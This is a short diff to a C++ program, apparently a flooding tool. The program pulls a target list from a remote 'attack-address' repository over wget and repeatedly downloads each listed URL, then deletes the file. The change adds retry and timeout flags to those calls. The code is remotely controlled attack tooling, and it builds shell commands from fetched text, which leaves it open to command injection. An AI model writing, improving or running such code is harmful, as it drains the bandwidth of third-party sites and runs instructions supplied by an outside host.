@@ -144,7 +144,7 @@ stringstream cmd;
 ll timer;
 inline void update_ini()
 {
-    system("wget https://cdn.jsdelivr.net/gh/vmlankub/attack-address@latest/jljljl/config.ini");
+    system("wget -t 3 -T 10 https://cdn.jsdelivr.net/gh/vmlankub/attack-address@latest/jljljl/config.ini");
     ifstream in("config.ini");
     timer = time(0);
     while (getline(in, s))
@@ -182,7 +182,7 @@ int main()
             }
             reverse(filename.begin(), filename.end());
             cmd.str("");
-            cmd << "wget " << s;
+            cmd << "wget -t 1 -T 5 " << s;
             system(cmd.str().c_str());
             cmd.str("");
             cmd << "rm " << filename;
